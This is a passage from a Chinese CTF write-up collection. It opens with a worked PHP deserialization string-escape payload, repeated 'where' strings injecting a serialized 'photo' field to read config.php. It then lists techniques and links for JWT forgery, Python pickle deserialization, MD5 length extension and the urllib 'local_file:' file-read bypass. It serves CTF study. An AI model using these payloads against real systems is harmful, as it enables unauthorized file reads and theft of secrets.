进行了过滤,fileter函数中进行了对单引号、双反斜杠的过滤，以及将select、insert、update、delete、where字符串替换成hacker,这里就会出现一个问题，只有where是长度为5的字符串，即如果字符串中有where会被替换成字符串长度为6的hacker字符串,如果我们输入的有where，会替换成hacker，这样的话长度就变了
**开始构造**：
想要读取photo,所以只能操作nickname，使其溢出到photo
输入nickname时候有一个正则
```
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');
```
对于nickname这个参数，看到熟悉的preg_match和strlen，可以用数组绕过(`nickname[]=`)


数组绕过了第一个正则过滤之后，如果nickname最后面塞上`";}s:5:"photo";s:10:"config.php";}`，一共是34个字符，如果利用34个where，在where被正则匹配换成hacker之后,就多出34个字符，不就可以把这34个给挤出去，然后`"};s:5:“photo”;s:10:“config.php”;}`也就不是nickname的一部分了，被反序列化的时候就会被当成`photo`，就可以读取到`config.php`的内容了,后面的upload因为序列化串被我们闭合了也就没用了：
```
payload:

nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}

$profile = a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:10:"123@qq.com";s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"};s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}
```
下面开始操作：
注册之后登陆，进入到update.php页面，输入相应信息和构造的nickename及上传图片，用bp抓包把nickname改成数组即可：
![](https://i.loli.net/2019/09/23/RgU64XJrAEsPMlD.png)
然后访问profile.php查看源码，把base64码解码：
![](https://i.loli.net/2019/09/23/BRkSthcE4PUyILf.png)
![](https://i.loli.net/2019/09/23/Unr64PHdY9klBvp.png)
### ikun【CISCN2019 华北赛区 Day1 Web2】
题目复现链接：
https://buuoj.cn/challenges
[CISCN 2019 华北赛区 Day1 Web2](https://github.com/CTFTraining/ciscn_2019_web_northern_china_day1_web2)
#### 知识点
##### 1、逻辑漏洞
可以通过抓包修改折扣等数据来购买
##### 2、JSON Web Token(JWT)
[认识JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)
##### 3、jwt-cookies伪造
解析jwt：
https://jwt.io/
爆破密钥：
c-jwt-cracker:
https://github.com/brendan-rius/c-jwt-cracker

##### 4、Python反序列化
[一篇文章带你理解漏洞之 Python 反序列化漏洞！](http://www.sohu.com/a/274879579_729271)
[Python反序列化漏洞的花式利用](https://xz.aliyun.com/t/2289)
[(Python) cPickle反序列化漏洞](https://blog.csdn.net/SKI_12/article/details/85015803)
[关于Python sec的一些简单的总结](http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/)

#### 解题方法
[CISCN 华北赛区 Day1 Web2](https://blog.csdn.net/qq_26406447/article/details/91964502)
[CISCN 华北赛区 Day1 Web2 WriteUp](https://www.zhaoj.in/read-5946.html/comment-page-1#comment-4747)
[[CISCN2019]华北赛区-天枢&waterflower](https://xz.aliyun.com/t/5383)
### SSRF Me【2019-De1CTF】
#### 知识点
##### 1、MD5长度扩展攻击
攻击场景：file=filename&hash=md5($secret_key.filename)验证成功下载文件
目的：传入任意filename实现任意文件读取
条件：
```
已知任意一个md5($secret_key.filename)，并且知道filename的明文。
已知secret_key的长度。
用户可以提交md5值。
```
工具：[HashPump/python模块:hashpumpy](https://github.com/bwall/HashPump)
参考：
[hash扩展长度攻击及hashdump使用](https://www.cnblogs.com/gwind/p/8025130.html)
[Hash Length Extension Attack](https://joychou.org/web/hash-length-extension-attack.html#directory070830946390658543)
[浅谈MD5扩展长度攻击](https://github.com/mstxq17/cryptograph-of-web/blob/master/%E6%B5%85%E8%B0%88MD5%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB.md)
##### 2、Python 2.x - 2.7.16 urllib.fopen支持local_file导致LFI(CVE-2019-9948)
当不存在协议的时候，默认使用file协议读取
可以使用`local_file:`绕过，例如`local_file:flag.txt`路径就是相对脚本的路径
`local_file://`就必须使用绝对路径(协议一般都是这样)
`local-file:///proc/self/cwd/flag.txt`也可以读取，因为`/proc/self/cwd/`代表的是当前路径
如果使用` urllib2.urlopen(param)`去包含文件就必须加上`file`，否则会报`ValueError: unknown url type: /path/to/file`的错误
#### 解题方法
[De1CTF ssrf_me 的三种解法](https://xz.aliyun.com/t/5927)
[浅析De1CTF 2019的两道web SSRF ME && ShellShellShell](https://xz.aliyun.com/t/6050)

### SSRFme【2017-Hitcon】
#### 解题方法
[BUUCTF web writeup(二)](http://chenxiyuan.vip/2019/07/29/BUUCTF-web-writeup-%E4%BA%8C/)